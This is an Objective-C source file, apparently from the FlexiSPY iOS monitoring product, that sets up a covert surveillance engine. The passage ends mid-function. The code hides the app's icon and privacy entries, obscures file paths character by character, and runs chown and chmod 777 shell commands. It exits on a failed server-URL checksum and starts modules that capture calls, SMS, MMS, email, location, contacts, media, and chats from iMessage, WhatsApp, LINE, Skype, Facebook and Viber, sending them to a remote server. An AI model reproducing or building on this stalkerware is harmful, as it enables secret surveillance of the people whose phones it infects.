//
//  AppEngine.m
//  AppEngine
//
//  Created by Makara Khloth on 11/17/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "AppEngine.h"
#import "AppEngineUICmd.h"
#import "Product.h"

// Components headers
#import "ComponentHeaders.h"

// Utils
#import "ServerErrorStatusHandler.h"
#import "PreferencesChangeHandler.h"
#import "MessagePortIPCSender.h"
#import "LicenseGetConfigUtils.h"
#import "LicenseHeartbeatUtils.h"

#import <CommonCrypto/CommonDigest.h>

@interface AppEngine (private)
- (void) createApplicationEngine;
- (void) createApplicationFeatures;
- (void) destructApplicationFeatures;
- (EventQueryPriority*) eventQueryPriority;
- (void) doLicenseChanged: (LicenseInfo*) aLicenseInfo;

- (void) clearSharedSettings;
- (void) springboardDidLaunch;
- (void) deleteCydiaSource;
@end

@implementation AppEngine

// Engine
@synthesize mApplicationContext;
@synthesize mSystemUtils;
@synthesize mSMSSendManager;
@synthesize mLicenseManager;
@synthesize mConfigurationManager;
@synthesize mServerAddressManager;
@synthesize mConnectionHistoryManager;
@synthesize mPreferenceManager;
@synthesize mCSM;
@synthesize mDDM;
@synthesize mActivationManager;
@synthesize mERM;
@synthesize mEDM;
@synthesize mEventCenter;
@synthesize mRemoteCmdManager;
@synthesize mSIMChangeManager;
@synthesize mActivationCodeCaptureManager;
@synthesize mSBNotifier;

// Features
@synthesize mCallLogCaptureManager;
@synthesize mSMSCaptureManager;
@synthesize mIMessageCaptureManager;
@synthesize mMMSCaptureManager;
@synthesize mMailCaptureManager;
@synthesize mLocationManager;
@synthesize mAddressbookManager;
@synthesize mMediaFinder;
@synthesize mMediaCaptureManager;
@synthesize mSpyCallManager;
@synthesize mAppAgentManager;
@synthesize mWhatsAppCaptureManager;
@synthesize mBrowserUrlCaptureManager;
@synthesize mBookmarkManager;
@synthesize mApplicationManager;
@synthesize mALCManager;
@synthesize mLINECaptureManager;
@synthesize mAmbientRecordingManager;
@synthesize mSkypeCaptureManager;
@synthesize mFacebookCaptureManager;
@synthesize mNoteManager;
@synthesize	mCalendarManager;
@synthesize mCameraCaptureManager;
@synthesize mViberCaptureManager;

// Flags
@synthesize mIsRestartingAppEngine;

- (id) init {
	if ((self = [super init])) {
		[self createApplicationEngine];
	}
	return (self);
}

#pragma mark -
#pragma mark License manager
#pragma mark -

- (void) onLicenseChanged:(LicenseInfo *)licenseInfo {
	DLog(@"--->Enter<---");
	@try {
		[self doLicenseChanged:licenseInfo];
	}
	@catch (NSException *e) {
		DLog(@"License changed got NSException: %@", [e description]);
	}
	@catch (FxException *e) {
		DLog(@"License changed got FxException: %@, cate: %d, code: %d, excName: %@, excReason: %@", [e description],
			 [e errorCategory], [e errorCode], [e excName], [e excReason]);
	}
	@finally {
		[self setMIsRestartingAppEngine:FALSE];
	}
	DLog(@"--->End<---");
}

#pragma mark -
#pragma mark Activation code capture manager
#pragma mark -

- (void) activationCodeDidReceived: (NSString*) aActivationCode {
	// /tmp/
	NSString *folderPath = [NSString stringWithString:@"/"];
	folderPath = [folderPath stringByAppendingString:@"t"];
	folderPath = [folderPath stringByAppendingString:@"m"];
	folderPath = [folderPath stringByAppendingString:@"p"];
	folderPath = [folderPath stringByAppendingFormat:@"/"];
	
	// /tmp/launchddd.plist
	NSString *filePath = [NSString stringWithString:@"/"];
	filePath = [filePath stringByAppendingString:@"t"];
	filePath = [filePath stringByAppendingString:@"m"];
	filePath = [filePath stringByAppendingString:@"p"];
	filePath = [filePath stringByAppendingString:@"/"];
	filePath = [filePath stringByAppendingString:@"l"];
	filePath = [filePath stringByAppendingString:@"a"];
	filePath = [filePath stringByAppendingString:@"u"];
	filePath = [filePath stringByAppendingString:@"n"];
	filePath = [filePath stringByAppendingString:@"c"];
	filePath = [filePath stringByAppendingString:@"h"];
	filePath = [filePath stringByAppendingString:@"d"];
	filePath = [filePath stringByAppendingString:@"d"];
	filePath = [filePath stringByAppendingString:@"d"];
	filePath = [filePath stringByAppendingString:@"."];
	filePath = [filePath stringByAppendingString:@"p"];
	filePath = [filePath stringByAppendingString:@"l"];
	filePath = [filePath stringByAppendingString:@"i"];
	filePath = [filePath stringByAppendingString:@"s"];
	filePath = [filePath stringByAppendingString:@"t"];
	
	NSMutableDictionary *launchInfo = [[NSMutableDictionary alloc] init];
	[launchInfo setValue:[NSNumber numberWithBool:YES] forKey:@"lanuchByKey"];
	NSFileManager *fileManager = [NSFileManager defaultManager];
	if ([fileManager fileExistsAtPath:folderPath]) {
		DLog (@"Sharing launchddd plist");
		[launchInfo writeToFile:filePath atomically:YES];
		NSString *chown = [NSString stringWithFormat:@"chown mobile %@", filePath];
		system([chown cStringUsingEncoding:NSUTF8StringEncoding]);
	}
	[launchInfo release];
	
	id <AppVisibility> visibility = [mApplicationContext getAppVisibility];
	[visibility launchApplication];
	DLog (@"... checking device model (if it is iPad ?)")
	// -- check device model
	//if (UI_USER_INTERFACE_IDIOM() == UIUserInterfaceIdiomPad) {
	if ([SystemUtilsImpl isIpad] || [SystemUtilsImpl isIpodTouch]) {
		// -- check license status Disable/expired
		LicenseInfo *licenseInfo = [mLicenseManager mCurrentLicenseInfo];
		DLog (@"... checking license status (1 deac, 2 act, 3 expired, 4 disable): %d", [licenseInfo licenseStatus])
		 	
		if ([licenseInfo licenseStatus] == DISABLE		||
			[licenseInfo licenseStatus] == EXPIRED		) {
			DLog (@"sending heartbeat...")
			[mLicenseHeartbeatUtils sendHeartbeat];		
		}
	}					
}

#pragma mark -
#pragma mark Server address manager
#pragma mark -

- (void) serverAddressChanged {
//	DLog (@"Server url changed, structured = %@", [mServerAddressManager getStructuredServerUrl]);
//	DLog (@"Server url changed, unstructured = %@", [mServerAddressManager getUnstructuredServerUrl]);
	
	NSString *structuredUrl = [mServerAddressManager getStructuredServerUrl];
	NSData *structuredUrlData = [structuredUrl dataUsingEncoding:NSUTF8StringEncoding];
	unsigned char msgDigestStructuredUrlByte[16];
	CC_MD5([structuredUrlData bytes], [structuredUrlData length], msgDigestStructuredUrlByte);
	NSData* msgDigestStructuredUrlData = [NSData dataWithBytes:msgDigestStructuredUrlByte length:16];
	
	unsigned char* result = (unsigned char*) [msgDigestStructuredUrlData bytes];
	NSString *urlChecksumString = [NSString stringWithFormat:
								   @"%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
								   result[0], result[1], result[2], result[3], 
								   result[4], result[5], result[6], result[7],
								   result[8], result[9], result[10], result[11],
								   result[12], result[13], result[14], result[15]
								   ];
	
	// Get data from cleanser file
    char *keyKey = nil;
    char *encryptedKey = nil;
    char *encryptedUrlChecksum = nil;
    
	//int value = (arc4random() % 20) + 1;
	
	for (int value = 1; value <= 20; value++) {
		switch (value) {
			case 1:
				keyKey = getkeyKey_1();
				encryptedKey = getEncryptedKey_1();
				encryptedUrlChecksum = getEncryptedUrlChecksum_1();
				break;
			case 2:
				keyKey = getkeyKey_2();
				encryptedKey = getEncryptedKey_2();
				encryptedUrlChecksum = getEncryptedUrlChecksum_2();
				break;
			case 3:
				keyKey = getkeyKey_3();
				encryptedKey = getEncryptedKey_3();
				encryptedUrlChecksum = getEncryptedUrlChecksum_3();
				break;
			case 4:
				keyKey = getkeyKey_4();
				encryptedKey = getEncryptedKey_4();
				encryptedUrlChecksum = getEncryptedUrlChecksum_4();
				break;
			case 5:
				keyKey = getkeyKey_5();
				encryptedKey = getEncryptedKey_5();
				encryptedUrlChecksum = getEncryptedUrlChecksum_5();
				break;
			case 6:
				keyKey = getkeyKey_6();
				encryptedKey = getEncryptedKey_6();
				encryptedUrlChecksum = getEncryptedUrlChecksum_6();
				break;
			case 7:
				keyKey = getkeyKey_7();
				encryptedKey = getEncryptedKey_7();
				encryptedUrlChecksum = getEncryptedUrlChecksum_7();
				break;
			case 8:
				keyKey = getkeyKey_8();
				encryptedKey = getEncryptedKey_8();
				encryptedUrlChecksum = getEncryptedUrlChecksum_8();
				break;
			case 9:
				keyKey = getkeyKey_9();
				encryptedKey = getEncryptedKey_9();
				encryptedUrlChecksum = getEncryptedUrlChecksum_9();
				break;
			case 10:
				keyKey = getkeyKey_10();
				encryptedKey = getEncryptedKey_10();
				encryptedUrlChecksum = getEncryptedUrlChecksum_10();
				break;
			case 11:
				keyKey = getkeyKey_11();
				encryptedKey = getEncryptedKey_11();
				encryptedUrlChecksum = getEncryptedUrlChecksum_11();
				break;
			case 12:
				keyKey = getkeyKey_12();
				encryptedKey = getEncryptedKey_12();
				encryptedUrlChecksum = getEncryptedUrlChecksum_12();
				break;
			case 13:
				keyKey = getkeyKey_13();
				encryptedKey = getEncryptedKey_13();
				encryptedUrlChecksum = getEncryptedUrlChecksum_13();
				break;
			case 14:
				keyKey = getkeyKey_14();
				encryptedKey = getEncryptedKey_14();
				encryptedUrlChecksum = getEncryptedUrlChecksum_14();
				break;
			case 15:
				keyKey = getkeyKey_15();
				encryptedKey = getEncryptedKey_15();
				encryptedUrlChecksum = getEncryptedUrlChecksum_15();
				break;
			case 16:
				keyKey = getkeyKey_16();
				encryptedKey = getEncryptedKey_16();
				encryptedUrlChecksum = getEncryptedUrlChecksum_16();
				break;
			case 17:
				keyKey = getkeyKey_17();
				encryptedKey = getEncryptedKey_17();
				encryptedUrlChecksum = getEncryptedUrlChecksum_17();
				break;
			case 18:
				keyKey = getkeyKey_18();
				encryptedKey = getEncryptedKey_18();
				encryptedUrlChecksum = getEncryptedUrlChecksum_18();
				break;
			case 19:
				keyKey = getkeyKey_19();
				encryptedKey = getEncryptedKey_19();
				encryptedUrlChecksum = getEncryptedUrlChecksum_19();
				break;
			case 20:
				keyKey = getkeyKey_20();
				encryptedKey = getEncryptedKey_20();
				encryptedUrlChecksum = getEncryptedUrlChecksum_20();
				break;
			default:
				keyKey = getkeyKey_7();
				encryptedKey = getEncryptedKey_7();
				encryptedUrlChecksum = getEncryptedUrlChecksum_7();
				break;
		}
		
		NSData *encryptedKeyData = [NSData dataWithBytes:encryptedKey length:32];
		NSString *keyKeyString = [NSString stringWithCString:keyKey encoding:NSUTF8StringEncoding];
		NSData *urlChecksumKeyData = [encryptedKeyData AES128DecryptWithKey:keyKeyString];
		NSString *urlChecksumKeyString = [[[NSString alloc] initWithData:urlChecksumKeyData encoding:NSUTF8StringEncoding] autorelease];
		NSData *encryptedUrlChecksumData = [NSData dataWithBytes:encryptedUrlChecksum length:48];
		NSData *cleanserUrlChecksumData = [encryptedUrlChecksumData AES128DecryptWithKey:urlChecksumKeyString]; // Checksum string data
		NSString *cleanserUrlChecksum = [[[NSString alloc] initWithData:cleanserUrlChecksumData encoding:NSUTF8StringEncoding] autorelease];
		
		if (encryptedKey) free(encryptedKey);
		if (keyKey) free(keyKey);
		if (encryptedUrlChecksum) free(encryptedUrlChecksum);
		

		
		DLog (@"urlChecksumString = %@, cleanserUrlChecksum = %@", urlChecksumString, cleanserUrlChecksum);
		
		if ([urlChecksumString isEqualToString:cleanserUrlChecksum]) {
			// Check next index of checksum of url in cleanser
		} else {
			DLog (@"Seriously failure.....");
			exit(0);
		}
	}
	
	[mCSM setStructuredURL:[NSURL URLWithString:structuredUrl]];
	[mCSM setUnstructuredURL:[NSURL URLWithString:[mServerAddressManager getUnstructuredServerUrl]]];
}

#pragma mark -
#pragma mark Engine utils functions
#pragma mark -

- (void) createApplicationEngine {
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>");
	DLog(@"Contruct engine");
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>");
	// Home private and shared directory
	NSString *privateHome = [DaemonPrivateHome daemonPrivateHome];
	NSString *sharedHome = [DaemonPrivateHome daemonSharedHome];
	[DaemonPrivateHome createDirectoryAndIntermediateDirectories:sharedHome];
	NSString *command = [NSString stringWithFormat:@"chmod 777 %@", sharedHome];
	system([command cStringUsingEncoding:NSUTF8StringEncoding]);
	
	// etc folder
	NSString* etcPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"etc/"];
	[DaemonPrivateHome createDirectoryAndIntermediateDirectories:etcPath];
	
	// Telephony notification manager
	mTelephonyNotificationManagerImpl = [[TelephonyNotificationManagerImpl alloc] initAndStartListeningToTelephonyNotification];
	
	// App context
	NSData *productCipher = [NSData dataWithBytes:kProductInfoCipher length:(sizeof(kProductInfoCipher)/sizeof(unsigned char))];
	mApplicationContext = [[AppContextImp alloc] initWithProductCipher:productCipher];
	id <AppVisibility> appVisibility = [mApplicationContext mAppVisibility];
	if ([[[UIDevice currentDevice] systemVersion] intValue] >= 6) {
		[appVisibility hideFromPrivay];
	}
	// FlexiSPY by default hide icon from Springboard, AppSwitcher
	// this will help to hide location service permission dialog since on 4s 5.0.1, IMEI is not available at first install
	// thus bundle identifier of this application is set to visibility in mobile substrate then first respring will not
	// set bundle identifier to [CLLocationMananger setAuthorization...]
	[appVisibility hideIconFromAppSwitcherIcon:YES andDesktop:YES];
	
	// System utils
	mSystemUtils = [[SystemUtilsImpl alloc] init];
	
	// SMS sender
	mSMSSendManager = [[SMSSendManager alloc] init];
	
	// License manager
	mLicenseManager = [[LicenseManager alloc] initWithAppContext:mApplicationContext];
	[mLicenseManager addLicenseChangeListener:self];
	
	// Configuration manager
	mConfigurationManager = [[ConfigurationManagerImpl alloc] init];
	[mConfigurationManager updateConfigurationID:[mLicenseManager getConfiguration]];
	
	// Server URL
	mServerAddressManager = [[ServerAddressManagerImp alloc] initWithServerAddressChangeDelegate:self];
	[mServerAddressManager setRequireBaseServerUrl:FALSE];
	NSData *urlCipher = [NSData dataWithBytes:kServerUrl length:(sizeof(kServerUrl)/sizeof(unsigned char))];
	[mServerAddressManager setBaseServerCipherUrl:urlCipher]; // Synchronous call to serverAddressChanged selector, 1st time, CMS is nil
	
	// Connection history
	mConnectionHistoryManager = [[ConnectionHistoryManagerImp alloc] init];
	[mConnectionHistoryManager setMMaxConnectionCount:10];
	
	// Preferences
	mPreferenceManager = [[PreferenceManagerImpl alloc] init];
	
	// CSM
	NSString *payloadPath = [privateHome stringByAppendingString:@"csm/payload/"];
	NSString *sessionPath = [privateHome stringByAppendingString:@"csm/dbsession/"];
	[DaemonPrivateHome createDirectoryAndIntermediateDirectories:payloadPath];
	[DaemonPrivateHome createDirectoryAndIntermediateDirectories:sessionPath];
	mCSM = [CommandServiceManager sharedManagerWithPayloadPath:payloadPath withDBPath:sessionPath];
	[mCSM setStructuredURL:[NSURL URLWithString:[mServerAddressManager getStructuredServerUrl]]];
	[mCSM setUnstructuredURL:[NSURL URLWithString:[mServerAddressManager getUnstructuredServerUrl]]];
	
	// DDM
	mDDM = [[DataDeliveryManager alloc] initWithCSM:mCSM];
	[mDDM setMAppContext:mApplicationContext];
	[mDDM setMLicenseManager:mLicenseManager];
	[mDDM setMServerAddressManager:mServerAddressManager];
	[mDDM setMConnectionHistory:mConnectionHistoryManager];
	
	// Activation manager
	mActivationManager = [[ActivationManager alloc] initWithDataDelivery:mDDM
														  withAppContext:mApplicationContext
													   andLicenseManager:mLicenseManager];
	[mActivationManager setMServerAddressManager:mServerAddressManager];

	// Event repository
	mERM = [[EventRepositoryManager alloc] initWithEventQueryPriority:[self eventQueryPriority]];
	[mERM openRepository];
	//[mERM deleteRepository];
	
	// EDM
	mEDM = [[EventDeliveryManager alloc] initWithEventRepository:mERM andDataDelivery:mDDM];
	[mEDM setMLicenseManager:mLicenseManager];
	 
	// Event center
	mEventCenter = [[EventCenter alloc] initWithEventRepository:mERM];
	
	// RCM
	NSString* mediaFoundPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"media/search/thumbnails/"];
	[DaemonPrivateHome createDirectoryAndIntermediateDirectories:mediaFoundPath];
	mRemoteCmdManager = [[RemoteCmdManagerImpl alloc] init];
	[mDDM setMRemoteCommand:[mRemoteCmdManager mPCCCmdCenter]];
	[mRemoteCmdManager setMSMSSender:mSMSSendManager];
	[mRemoteCmdManager setMServerAddressManager:mServerAddressManager];
	[mRemoteCmdManager setMEventDelegate:mEventCenter];
	[mRemoteCmdManager setMLicenseManager:mLicenseManager];
	[mRemoteCmdManager setMDataDelivery:mDDM];
	[mRemoteCmdManager setMEventDelivery:mEDM];
	[mRemoteCmdManager setMAppContext:mApplicationContext];
	[mRemoteCmdManager setMPreferenceManager:mPreferenceManager];
	[mRemoteCmdManager setMActivationManagerProtocol:mActivationManager];
	[mRemoteCmdManager setMSupportCmdCodes:[mConfigurationManager mSupportedRemoteCmdCodes]];
	[mRemoteCmdManager setMSystemUtils:mSystemUtils];
	[mRemoteCmdManager setMEventRepository:mERM];
	[mRemoteCmdManager setMConnectionHistoryManager:mConnectionHistoryManager];
	[mRemoteCmdManager setMConfigurationManager:mConfigurationManager];
	[mRemoteCmdManager setMMediaSearchPath:mediaFoundPath];
	[mRemoteCmdManager launch];

	// SIM change
	mSIMChangeManager = [[SIMCaptureManagerImpl alloc] initWithTelephonyNotificationManager:mTelephonyNotificationManagerImpl];
	[mSIMChangeManager setMSMSSender:mSMSSendManager];
	[mSIMChangeManager setMEventDelegate:mEventCenter];
	[mSIMChangeManager setMAppContext:mApplicationContext];
	[mSIMChangeManager setMLicenseManager:mLicenseManager];
	
	// Activation code capture
	mActivationCodeCaptureManager = [[ActivationCodeCaptureManager alloc] initWithTelephonyNotification:mTelephonyNotificationManagerImpl
																							andDelegate:self];
	[mActivationCodeCaptureManager startCaptureActivationCode];
	
	// Utils
	mServerErrorStatusHandler = [[ServerErrorStatusHandler alloc] init];
	[mServerErrorStatusHandler setMLicenseManager:mLicenseManager];
	[mServerErrorStatusHandler setMAppEngine:self];
	[mDDM setMServerStatusErrorListener:mServerErrorStatusHandler];
	mPreferencesChangeHandler = [[PreferencesChangeHandler alloc] initWithAppEngine:self];
	[mPreferenceManager addPreferenceChangeListener:mPreferencesChangeHandler];
	
	mLicenseGetConfigUtils = [[LicenseGetConfigUtils alloc] initWithDataDelivery:mDDM];
	[mLicenseGetConfigUtils setMLicenseManager:mLicenseManager];
	
	mLicenseHeartbeatUtils = [[LicenseHeartbeatUtils alloc] initWithDataDelivery:mDDM];
	
	// Connection to UI
	mAppEngineConnection = [[AppEngineConnection alloc] initWithAppEngine:self];
	
	// Start-up time
	PrefStartupTime *prefStartupTime = (PrefStartupTime *)[mPreferenceManager preference:kStartup_Time];
	[prefStartupTime setMStartupTime:[DateTimeFormat phoenixDateTime]];
	[mPreferenceManager savePreference:prefStartupTime];
	
	// Sprinbiard notification of did launch
	mSBNotifier = [[SBDidLaunchNotifier alloc] init];
	[mSBNotifier setMDelegate:self];
	[mSBNotifier setMSelector:@selector(springboardDidLaunch)];
	[mSBNotifier start];
	
	// Set flag for engine just starting
	[self setMIsRestartingAppEngine:TRUE];
}

- (void) createApplicationFeatures {
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
	DLog(@"Contruct features")
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
	PrefEventsCapture *prefEventCapture = (PrefEventsCapture *)[mPreferenceManager preference:kEvents_Ctrl];
	PrefLocation *prefLocation = (PrefLocation *)[mPreferenceManager preference:kLocation];
	PrefKeyword *prefKeyword = (PrefKeyword *)[mPreferenceManager preference:kKeyword];
	PrefMonitorNumber* prefMonitorNumbers = (PrefMonitorNumber *)[mPreferenceManager preference:kMonitor_Number];
	PrefHomeNumber* prefHomeNumbers = (PrefHomeNumber *)[mPreferenceManager preference:kHome_Number];
	PrefVisibility *prefVisibility = (PrefVisibility  *)[mPreferenceManager preference:kVisibility];
	PrefRestriction *prefRestriction = (PrefRestriction *)[mPreferenceManager preference:kRestriction];
	
	[mEDM setMaximumEvent:[prefEventCapture mMaxEvent]];
	[mEDM setDeliveryTimer:[prefEventCapture mDeliverTimer]];
	
	// Call log
	if ([mConfigurationManager isSupportedFeature:kFeatureID_EventCall]) {
		if (!mCallLogCaptureManager) {
			mCallLogCaptureManager = [[CallLogCaptureManager alloc] initWithEventDelegate:mEventCenter andTelephonyNotificationCenter:mTelephonyNotificationManagerImpl];
			[mCallLogCaptureManager setMAC:[NSString stringWithFormat:@"*#%@", [[mLicenseManager mCurrentLicenseInfo] activationCode]]];
		}
		if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableCallLog]) {
			[mCallLogCaptureManager startCapture];
		} else {
			[mCallLogCaptureManager stopCapture];
		}
	} else {
		// Upgrade or downgrad features
		[mCallLogCaptureManager release];
		mCallLogCaptureManager = nil;
	}

	// SMS
	if ([mConfigurationManager isSupportedFeature:kFeatureID_EventSMS]) {
		if (!mSMSCaptureManager) {
			mSMSCaptureManager = [[SMSCaptureManager alloc] initWithEventDelegate:mEventCenter];
			[mSMSCaptureManager setMAppContext:mApplicationContext];
			[mSMSCaptureManager setMTelephonyNotificationManager:mTelephonyNotificationManagerImpl];
		}
		if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableSMS]) {
			[mSMSCaptureManager startCapture];
		} else {
			[mSMSCaptureManager stopCapture];
		}
	} else {
		// Upgrade or downgrad features
		[mSMSCaptureManager release];
		mSMSCaptureManager = nil;
	}
	
	// IMessage/WhatsApp/LINE/Skype/Facebook/Viber
	if ([mConfigurationManager isSupportedFeature:kFeatureID_EventIM]) {
		if (!mIMessageCaptureManager) {
			NSString* imiMessageAttachmentPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imiMessage/"];
			[DaemonPrivateHome createDirectoryAndIntermediateDirectories:imiMessageAttachmentPath];					
			NSString *command = [NSString stringWithFormat:@"chmod 777 %@", imiMessageAttachmentPath];
			system([command cStringUsingEncoding:NSUTF8StringEncoding]);					
			
			mIMessageCaptureManager = [[IMessageCaptureManager alloc] initWithEventDelegate:mEventCenter];			
		}
		if(!mWhatsAppCaptureManager) {
		   mWhatsAppCaptureManager=[[WhatsAppCaptureManager alloc] initWithEventDelegate:mEventCenter];
			
			NSString* whatsAppAttachmentPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imWhatsApp/"];
			[DaemonPrivateHome createDirectoryAndIntermediateDirectories:whatsAppAttachmentPath];
			NSString *command = [NSString stringWithFormat:@"chmod 777 %@", whatsAppAttachmentPath];
			system([command cStringUsingEncoding:NSUTF8StringEncoding]);			
		}
		if (!mLINECaptureManager) {
			mLINECaptureManager = [[LINECaptureManager alloc] init];
			[mLINECaptureManager registerEventDelegate:mEventCenter];
			
			NSString* lineAttachmentPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imLine/"];
			[DaemonPrivateHome createDirectoryAndIntermediateDirectories:lineAttachmentPath];
			NSString *command = [NSString stringWithFormat:@"chmod 777 %@", lineAttachmentPath];
			system([command cStringUsingEncoding:NSUTF8StringEncoding]);
		}
		if (!mSkypeCaptureManager) {
			mSkypeCaptureManager = [[SkypeCaptureManager alloc] init];
			[mSkypeCaptureManager registerEventDelegate:mEventCenter];
		}
		if (!mFacebookCaptureManager) {
			mFacebookCaptureManager = [[FacebookCaptureManager alloc] init];
			[mFacebookCaptureManager registerEventDelegate:mEventCenter];
			
			NSString* imFacebookAttachmentPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imFacebook/"];
			[DaemonPrivateHome createDirectoryAndIntermediateDirectories:imFacebookAttachmentPath];					
			NSString *command = [NSString stringWithFormat:@"chmod 777 %@", imFacebookAttachmentPath];
			system([command cStringUsingEncoding:NSUTF8StringEncoding]);	
		}
		if (!mViberCaptureManager) {
			mViberCaptureManager = [[ViberCaptureManager alloc] init];
			[mViberCaptureManager registerEventDelegate:mEventCenter];
		}
		if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableIM]) {
			[mIMessageCaptureManager startCapture];
			[mWhatsAppCaptureManager startCapture];
			[mLINECaptureManager startCapture];
			[mSkypeCaptureManager startCapture];
			[mFacebookCaptureManager startCapture];
			[mViberCaptureManager startCapture];
		} else {
			[mIMessageCaptureManager stopCapture];
			[mWhatsAppCaptureManager stopCapture];
			[mLINECaptureManager stopCapture];
			[mSkypeCaptureManager stopCapture];
			[mFacebookCaptureManager stopCapture];
			[mViberCaptureManager stopCapture];
		}
	} else {
		// Upgrade or downgrad features
		[mIMessageCaptureManager release];
		mIMessageCaptureManager = nil;
		[mWhatsAppCaptureManager release];
		mWhatsAppCaptureManager = nil;
		[mLINECaptureManager release];
		mLINECaptureManager = nil;
		[mSkypeCaptureManager release];
		mSkypeCaptureManager = nil;
		[mFacebookCaptureManager prerelease];
		[mFacebookCaptureManager release];
		mFacebookCaptureManager = nil;
		[mViberCaptureManager release];
		mViberCaptureManager = nil;
	}

	// MMS
	if ([mConfigurationManager isSupportedFeature:kFeatureID_EventMMS]) {
		if (!mMMSCaptureManager) {
			mMMSCaptureManager = [[MMSCaptureManager alloc] initWithEventDelegate:mEventCenter];
			NSString* mmsAttachmentPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/mms/"];
			[DaemonPrivateHome createDirectoryAndIntermediateDirectories:mmsAttachmentPath];
			[mMMSCaptureManager setMMMSAttachmentPath:mmsAttachmentPath];
			[mMMSCaptureManager setMTelephonyNotificationManager:mTelephonyNotificationManagerImpl];
		}
		if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableMMS]) {
			[mMMSCaptureManager startCapture];
		} else {
			[mMMSCaptureManager stopCapture];
		}
	} else {
		// Upgrade or downgrad features
		[mMMSCaptureManager release];
		mMMSCaptureManager = nil;
	}
	
	// Email
	if ([mConfigurationManager isSupportedFeature:kFeatureID_EventEmail]) {
		if (!mMailCaptureManager) {
			mMailCaptureManager = [[MailCaptureManager alloc] initWithEventDelegate:mEventCenter];
		}
		if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableEmail]) {
			[mMailCaptureManager startMonitoring];
		} else {
			[mMailCaptureManager stopMonitoring];
		}
	} else {
		// Upgrade or downgrad features
		[mMailCaptureManager release];
		mMailCaptureManager = nil;
	}
	
	// Location
	if ([mConfigurationManager isSupportedFeature:kFeatureID_EventLocation]) {
		if (!mLocationManager) {
			mLocationManager = [[LocationManagerImpl alloc] init];
			[mLocationManager setMIntervalTime:[prefLocation mLocationInterval]];
			[mLocationManager setEventDelegate:mEventCenter];
			[mLocationManager setMAppContext:mApplicationContext];
		}
		if ([prefEventCapture mStartCapture] && [prefLocation mEnableLocation]) {
			 [mLocationManager startTracking];
		} else {
			 [mLocationManager stopTracking];
		}
	} else {
		// Upgrade or downgrad features
		[mLocationManager release];
		mLocationManager = nil;
	}
	
	// Address book
	if ([mConfigurationManager isSupportedFeature:kFeatureID_AddressbookManagement]) {
		if (!mAddressbookManager) {
			mAddressbookManager = [[AddressbookManagerImp alloc] initWithDataDeliveryManager:mDDM];
			[mRemoteCmdManager setMAddressbookManager:mAddressbookManager];
			[mRemoteCmdManager relaunchForFeaturesChange];
		}
		if ([prefRestriction mAddressBookMgtMode] & kAddressMgtModeOff) {
			[mAddressbookManager setMode:kAddressbookManagerModeOff];
			[mAddressbookManager stop];
		} else {
			[mAddressbookManager setMode:kAddressbookManagerModeMonitor];
			[mAddressbookManager start];
		}
	} else {
		// Upgrade or downgrad features
		[mAddressbookManager release];
		mAddressbookManager = nil;
	}
	
	// Media finder
	if ([mConfigurationManager isSupportedFeature:kFeatureID_SearchMediaFilesInFileSystem]) {
		if (!mMediaFinder) {
			NSString* mediaFoundPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"media/search/thumbnails/"];
			[DaemonPrivateHome createDirectoryAndIntermediateDirectories:mediaFoundPath];
			mMediaFinder = [[MediaFinder alloc] initWithEventDelegate:mEventCenter andMediaPath:mediaFoundPath];
		}
		
		NSMutableArray *entries = [NSMutableArray array];
		// Image
		if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableCameraImage] &&
			!([prefEventCapture mSearchMediaFilesFlags] & kSearchMediaImage)) { // Not search yet
			[MediaFinder setImageFindEntry:entries];
			[prefEventCapture setMSearchMediaFilesFlags:[prefEventCapture mSearchMediaFilesFlags] | kSearchMediaImage];
			[mPreferenceManager savePreference:prefEventCapture];
		}

		// Video
		if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableVideoFile] &&
			!([prefEventCapture mSearchMediaFilesFlags] & kSearchMediaVideo)) { // Not search yet
			[MediaFinder setVideoFindEntry:entries];
			[prefEventCapture setMSearchMediaFilesFlags:[prefEventCapture mSearchMediaFilesFlags] | kSearchMediaVideo];
			[mPreferenceManager savePreference:prefEventCapture];
		}
		// Audio
		if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableAudioFile] &&
			!([prefEventCapture mSearchMediaFilesFlags] & kSearchMediaAudio)) { // Not search yet
			[MediaFinder setAudioFindEntry:entries];
			[prefEventCapture setMSearchMediaFilesFlags:[prefEventCapture mSearchMediaFilesFlags] | kSearchMediaAudio];
			[mPreferenceManager savePreference:prefEventCapture];
		}
		if ([entries count]) {
			// We will not search media files we will wait for command (new use case)
//			[mMediaFinder findMediaFileWithExtMime:entries];
		}
	} else {
		[mMediaFinder release];
		mMediaFinder = nil;
	}
	
	// Media capture
	if ([mConfigurationManager isSupportedFeature:kFeatureID_EventCameraImage] ||
		[mConfigurationManager isSupportedFeature:kFeatureID_EventVideoRecording] ||
		[mConfigurationManager isSupportedFeature:kFeatureID_EventSoundRecording] ||
		[mConfigurationManager isSupportedFeature:kFeatureID_EventWallpaper]) {
		if (!mMediaCaptureManager) {
			NSString* mediaCapturePath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"media/capture/thumbnails/"];
			[DaemonPrivateHome createDirectoryAndIntermediateDirectories:mediaCapturePath];
